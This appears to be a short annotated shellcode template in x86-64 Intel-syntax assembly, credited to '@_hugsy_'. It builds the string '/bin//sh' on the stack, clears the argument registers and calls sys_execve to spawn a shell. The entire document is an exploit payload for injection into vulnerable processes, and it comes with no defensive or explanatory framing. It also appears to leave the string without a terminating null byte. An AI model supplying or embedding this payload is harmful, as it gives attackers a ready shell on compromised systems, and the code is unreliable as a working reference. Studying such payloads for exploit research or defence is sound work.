;;; @@@ arch:x86_64 @@@
;;; @@@ endian:little @@@
;;; @@@ syntax:intel @@@
;;;
;;; Intel x86-64 little endian sys_execve("/bin/sh")
;;; shellcode
;;; by @_hugsy_
;;;

;;; rax = sys_execve
mov rax, __NR_SYS_execve
;;; write /bin/sh @rsp
mov rsi, "hs//nib/" # or 0x68732f2f6e69622f
mov [rsp], rsi
;;; rdi = @/bin/sh
mov rdi, rsp
;;; nullify the other args
xor rsi, rsi
xor rdx, rdx
;;; trigger syscall
syscall